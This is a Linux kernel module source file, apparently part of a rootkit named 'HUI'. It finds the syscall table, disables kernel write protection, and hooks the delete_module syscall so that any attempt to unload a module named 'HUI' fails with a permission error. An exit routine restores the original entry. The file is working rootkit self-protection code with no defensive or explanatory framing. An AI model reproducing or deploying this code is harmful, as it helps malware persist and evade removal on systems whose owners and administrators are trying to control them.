#include "hui.h"
#include <linux/syscalls.h>
#include <linux/fdtable.h>

static asmlinkage long (*original_delete_module)(const struct pt_regs *regs);

asmlinkage long hui_hooked_delete_module(const struct pt_regs *regs) {
    const char __user *name_user = (const char __user *)regs->regs[0];
    char k_name[256] = {0};

    if (strncpy_from_user(k_name, name_user, sizeof(k_name) - 1) < 0) return -EFAULT;
    if (strcmp(k_name, "HUI") == 0) {
        return -EPERM;
    }
    return original_delete_module(regs);
}

int hui_protect_init(void) {
    if (!hui_state.sys_call_table) return -EFAULT;
    original_delete_module = (void *)hui_state.sys_call_table[__NR_delete_module];
    hui_disable_wp();
    hui_state.sys_call_table[__NR_delete_module] = (unsigned long)hui_hooked_delete_module;
    hui_enable_wp();
    return 0;
}

void hui_protect_exit(void) {
    if (hui_state.sys_call_table && original_delete_module) {
        hui_disable_wp();
        hui_state.sys_call_table[__NR_delete_module] = (unsigned long)original_delete_module;
        hui_enable_wp();
    }
}
